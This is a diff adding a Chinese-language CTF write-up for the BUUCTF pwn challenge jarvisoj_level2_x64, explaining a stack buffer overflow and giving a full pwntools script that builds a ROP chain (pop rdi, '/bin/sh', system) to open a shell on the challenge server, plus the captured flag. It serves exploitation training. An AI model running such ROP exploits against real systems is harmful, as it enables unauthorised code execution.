@@ -604,6 +604,65 @@ io.interactive()
 
 ------
 
+### [jarvisoj_level2_x64](https://buuoj.cn/challenges#jarvisoj_level2_x64)
+
+先`file ./level2_x64`查看文件类型再`checksec --file=./level2_x64`检查一下文件保护情况。
+
+ ![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level2_x64/1.png)
+
+用`IDA Pro 64bit`打开附件`level2_x64`，可以看到主函数的汇编语言代码如下，先是调用了一个名为`vulnerable_function()`的函数，然后系统调用`echo`语句输出了`Hello World!`。
+
+![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level2_x64/2.png)
+
+按`F5`进行反汇编后，可以看到`main()`函数的`C`语言代码如下：
+
+![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level2_x64/3.png)
+
+双击`vulnerable_function()`函数查看详情，可以看到该函数中有一个`char`型局部变量`buf`，其可用栈大小为`0x80`，但是`read()`函数限制从`stdin`中读入到`buf`的字节大小为`0x200`，显然存在栈溢出漏洞。
+
+![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level2_x64/4.png)
+
+双击`buf`变量查看其在函数栈中的情况，构造`payload`时可以先用`0x80`个字节占满`buf`变量，再用`0x8`个字节覆盖到栈帧`r`。
+
+![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level2_x64/5.png)
+
+在`Functions window`中可以看到有个`system()`函数，其地址为`0x4004C0`。
+
+![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level2_x64/6.png)
+
+使用`ROPgadget`可以查看到`/bin/sh`的地址为`0x600A90`。
+
+```bash
+ROPgadget --binary ./level2_x64 --string "/bin/sh"
+```
+
+![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level2_x64/7.png)
+
+`X86_64`架构的函数参数分别保存在`RDI`、`RSI`、`RDX`、`RCX`、`R8D`、`R9D`，剩下的参数从右往左依次入栈。因此该程序函数调用的第一个参数由`rdi`寄存器传递，使用`ROPgadget`可以查看到`pop rdi`的地址为`0x4006B3`。
+
+![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level2_x64/8.png)
+
+编写 `Python`代码即可得到`flag{32d6e6d5-6d67-4486-b72b-5351bcfc4cc8}`。
+
+```python
+from pwn import *
+
+context(arch='amd64', os='linux', log_level='debug')
+io = remote('node4.buuoj.cn', 27561)
+e = ELF('./level2_x64')
+system_address = e.symbols['system'] # 0x4004C0
+bin_sh_address = 0x600A90 # ROPgadget --binary ./level2_x64 --string "/bin/sh"
+pop_rdi = 0x4006B3 # ROPgadget --binary ./level2_x64 --only "pop|ret"
+payload = b'a'*0x80 + b'fuckpwn!'
+payload += p64(pop_rdi) + p64(bin_sh_address) + p64(system_address)
+io.sendlineafter(b'Input:\n', payload)
+io.interactive()
+```
+
+![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level2_x64/9.png)
+
+------
+
 ## ADWorld
 
 ### [get_shell](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5049)
